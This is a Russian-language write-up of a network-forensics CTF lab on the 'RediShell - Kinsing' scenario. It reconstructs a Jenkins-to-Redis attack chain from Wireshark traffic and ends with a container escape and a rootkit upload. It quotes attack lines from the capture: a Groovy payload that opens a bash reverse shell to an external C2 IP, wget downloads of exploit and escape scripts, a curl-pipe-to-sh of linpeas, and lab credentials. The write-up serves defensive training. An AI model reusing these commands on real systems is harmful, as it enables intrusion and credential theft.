# RediShell - Kinsing Lab 

[RediShell](https://cyberdefenders.org/blueteam-ctf-challenges/redishell-kinsing/)

**Категория:** Network Forensics  
**Инструмент:** Wireshark  

## Сценарий 

Перед развертыванием шифровальщика злоумышленники получили первоначальный доступ через неправильно настроенный CI/CD-сервер (Jenkins), работающий в Docker-контейнере в сети разработки Wowza. Система мониторинга безопасности зафиксировала необычные исходящие соединения из подсети контейнеров на подозрительный внешний IP адрес. Захват пакетов был запущен автоматически, но прекращен, когда атакующий обнаружил и завершил процесс мониторинга.  

---

## 1. Initial Access & Reconnaissance

#### Q1. Какой IP-адрес у первой скомпрометированной системы? -  `172.16.10.10`

Поиск по http в строке фильтра Wireshark.

В первом http запросе  вижу:
```
User-Agent: curl/8.15.0
+ внешний iP 185.220.101.50 инициирует соединение с внутренним хостом 172.16.10.10.
```
<img width="248" height="248" alt="1 вопрос" src="https://github.com/user-attachments/assets/997e4642-e0e6-4cc9-ab80-2e756dfff49b" />


#### Q2. Какой IP-адрес у C2-сервера атакующего? -  `185.220.101.50`

Фильтр ip.src == 172.16.10.10 && ip.dst != 172.16.0.0/16, увидела:

    Множественные соединения к 185.220.101.50:
    - [SYN/ACK] - рукопожатие установлено
    - [PSH,ACK] - передача данных
    - [TCP Retransmission] — сеть тормозит или пакет потерялся.
    - [TCP Dup ACK] - подтверждение получения
    
 Проверила  `185.220.101.50` в VirusTotal, он оказывается  известным Tor exit node.

 <img width="650" height="200" alt="2 вопрос" src="https://github.com/user-attachments/assets/a4eba2fd-c93c-4742-aca8-3fe1f3b02513" />

#### Q3. Какое веб-приложение и версия были эксплуатированы? -  `Jenkins, 2.387.1`

1. Выбрала первый http запрос к `172.16.10.10
2. follow - http stream
3. Прокручиваю до конца ответа сервера (обычно баннеры и версии прячут в футере или заголовках)
4. Нахожу html-код:

    ```html
    <div class="page-footer__links page-footer__links--white jenkins_ver">
      <a rel="noopener noreferrer" href="https://www.jenkins.io/" target="_blank">
        Jenkins 2.387.1
      </a>
    </div>
    ```

<img width="204" height="204" alt="3 вопрос" src="https://github.com/user-attachments/assets/b9f823dc-2a31-4f96-a8c1-b731e3fe1171" />

#### Q4. Какой файл атакующий прочитал первым для проверки RCE? -  `/etc/passwd`

1. Рядом нахожу  повторяющиеся post-запросы на `/script`

2. Нахожу `println+%27cat+%2Fetc%2Fpasswd%27.execute%28%29.text`, если декодировать -  `println 'cat /etc/passwd'.execute().text`

3. Так же команды до (сбор информации):

    ```
    1. println 'whoami'.execute().text
    2. println 'id'.execute().text 
    3. println 'cat /etc/passwd'.execute().text
    ```
<img width="750" height="400" alt="4 вопрос" src="https://github.com/user-attachments/assets/8fdd78aa-5d8b-4a5d-bbce-eb13e7343c4f" />


#### Q5. Какой URI-путь у уязвимого эндпоинта? -  `/script`

    POST http://172.16.10.10:8080/script HTTP/1.1
    
<img width="450" height="250" alt="4-5вопрос" src="https://github.com/user-attachments/assets/076a3856-cb6d-4dba-90a4-1b100786351f" />

---
## 2. Execution

#### Q6. Какой порт использовал атакующий для первого reverse shell? -  `4444`

1. Продолжила исследовать тот же http поток у /script.

2. Нашла более сложный закодированный параметр:

    ```
    script=def+cmd+%3D+%5B%22bash%22%2C+%22-c%22%2C+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F185.220.101.50%2F4444+0%3E%261%22%5D%3B+cmd.execute%28%29
    ```
    
3. Декодировала в CyberChef (URL Decode):

    ```groovy
    def cmd = ["bash", "-c", "bash -i >& /dev/tcp/185.220.101.50/4444 0>&1"]; cmd.execute()
    ```
    
 Сразу после этого запроса вижу новое соединение: `172.16.10.10:54322 - 185.220.101.50:4444`

 <img width="700" height="350" alt="6 вопрос" src="https://github.com/user-attachments/assets/d2925f4d-2c28-4dd5-9a96-0c3217d7c334" />

 ---
## 3. Discovery

#### Q7. Какой скрипт для enumeration привилегий атакующий загрузил? -  `linpeas.sh`

Нашла в потоке TCP Stream:

`.[?2004hjenkins@jenkins-web:/$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`

Linpeas - это автоматизированный скрипт для поиска способов повышения привилегий в Linux системе.

<img width="700" height="500" alt="7 вопрос" src="https://github.com/user-attachments/assets/638934e8-bd49-4947-95fc-23bea11399e9" />

---

## 4. Credential Access

#### Q8. Какой файл атакующий прочитал для получения учётных данных? -  `/var/jenkins_home/credentials.txt`

1. Нашла в том же TCP Stream. После выполнения linpeas был переход в /var/jenkins_home и открытие credentials.txt

    ```
    .[?2004hjenkins@jenkins-web:~$ ccaat ct crree	dentials.txt
    ```

2. Содержимое файла сразу выводится в том же потоке:
    ```
    # Corporate Network Credentials
    TELNET_USER=redis_user
    TELNET_PASS=R3d1s_Us3r_P@ss!
    TELNET_HOST=172.16.10.20
    ```

<img width="600" height="400" alt="8 вопрос" src="https://github.com/user-attachments/assets/a1a5624a-af4c-48fe-896f-94a4b1ee0bfb" />

#### Q9. Какую комбинацию имени пользователя и пароля использовал злоумышленник для входа во вторую систему?`redis_user:R3d1s_Us3r_P@ss!`

Нашла из  вывода `cat credentials.txt` .

![Uploading 9 вопрос.png…]()

---

## 5. Lateral Movement

#### Q10. Какой незашифрованный протокол использовал атакующий? -  `Telnet`

Из credentials.txt уже знаю что это TELNET_PORT=23

TELNET_USER=redis_user 
TELNET_PASS=R3d1s_Us3r_P@ss! 
TELNET_HOST=172.16.10.20 
TELNET_HOSTNAME=redis-db.corp.local 
TELNET_PORT=23

#### Q11. IP второй скомпрометированной системы? -  `172.16.10.20`

Из credentials.txt: TELNET_HOST=172.16.10.20 + подтвердила в трафике: соединение на этот iP по порту 23.
Получается что  оба скомпрометированных хоста в одной подсети.

#### Q12. Какое имя хоста у второго скомпрометированного контейнера и какая версия уязвимой службы хранения данных? - `redis-db.corp.local, 5.0.7`

Имя хоста уже было в credentials.txt -  TELNET_HOSTNAME=redis-db.corp.local

    # Server
    redis_version:5.0.7
    redis_git_sha1:00000000
    redis_mode:standalone

---

## 6. Privilege Escalation

#### Q13. Какой файл атакующий загрузил для эскалации? -  `exploit.lua`

1. Продолжила читать Telnet-поток после успешного входа как redis_user
   
    ```bash
    wget http://185.220.101.50:2345/exploit.lua
    chmod +x exploit.lua
    redis-cli -h 127.0.0.1 --eval exploit.lua (выполнить Lua-скрипт на стороне Redis-сервера)
    ```

2. Анализирую последнюю команду:

    ```bash
    redis-cli --eval exploit.lua
    # --eval: выполнить Lua-скрипт на стороне Redis-сервера
    # Это ключевой момент: эксплойт выполняется В КОНТЕКСТЕ Redis, а не просто как шелл-скрипт
    ```

Можно сделать вывод, что атакующий использовал специфичную для Redis уязвимость, предварительно изучил версию сервиса и подобрал целевой эксплойт.

#### Q14. Полный путь к SUID-бинарнику? -  `/usr/local/bin/redis-backup`

1. Ниже в потоке увидела команду поиска:

    ```bash
    SUID=$(find / -perm -4000 2>/dev/null | grep redis-backup)
    ```

2. И вывод:

    ```
    [+] Found: /usr/local/bin/redis-backup
    [+] Executing privilege escalation...
    ```

 Это значит, что файл redis-backup имеет SUID-бит и принадлежит root


#### Q15. Первая команда после повышения привилегий? -  `whoami`

Нашла сразу после выполнения redis-backup в потоке:

    .]0;root@redis-db: ~$ whoami
    root

#### Q16. CVE для уязвимости в Lua-подсистеме Redis? -  `CVE-2025-49844`

Нашла через внешний поиск.

---

## 7. Defense Evasion — Container Escape

#### Q17. Скрипт для выхода из контейнера? -  `escape.sh`

    wget http://185.220.101.50:2345/escape.sh
    chmod +x escape.sh
    ./escape.sh

+ Attempting Method 3: nsenter to host namespace... 
+ nsenter escape successful! - nsenter позволяет: войти в namespace хоста.

#### Q18. Порт reverse shell после escape? -  `5555`

Нашла в выводе `escape.sh`:

    Check for:
      1. Reverse shell on 185.220.101.50:5555
      2. Proof file on host: /tmp/you_have_been_hacked.txt

#### Q19. Какой номер CVE присвоен уязвимости, связанной с возможностью побега из контейнера?  -  `CVE-2022-0492`

[CVE](https://nvd.nist.gov/vuln/detail/CVE-2022-0492)

1. Из вывода escape.sh знаю что использовался метод `cgroup release_agent`.

2. Погуглила "cgroup" "release_agent" "container escape" CVE

Это стало возможным из-за избыточных привилегий контейнера. У нас он был запущен с --privileged.  В нормальной конфигурации контейнер не имеет доступа на запись в cgroup, но если он запущен в privileged режиме, он может изменить release_agent и заставить хост выполнить свой код. 

---

## 8. Persistence & Impact

#### Q20. Каков полный путь к файлу с доказательством компрометации, созданному злоумышленником в хост-системе? - `/tmp/you_have_been_hacked.txt`

Нашла в выводе escape.sh.

#### Q21. Какой сервер установили для загрузки файлов? -  `uploadserver`

Увидела в трафике после escape на хост последовательность:

    apt install python3-pip -y
    pip install uploadserver
    python3 -m uploadserver --directory /root/file

#### Q22. Какие файлы злоумышленник загрузил в систему хоста для установки руткита?  -  `kernel-rootkit.c, Makefile, install-rootkit.sh`

Чуть ниже в логе:

    [Uploaded] "kernel-rootkit.c" --> /root/file/kernel-rootkit.c (исходник руткита)
    [Uploaded] "Makefile" --> /root/file/Makefile (инструкция для компиляции)
    [Uploaded] "install-rootkit.sh" --> /root/file/install-rootkit.sh (скрипт установки)

---

## 9. Defense Evasion - Anti-Forensics

#### Q23. Команда для завершения захвата трафика? -  `kill -9 24918`

Далее трафик резко обрывается, атакующий проверяет, что его слушают, находит процесс мониторинга и завершает его:

    kill -9 24918
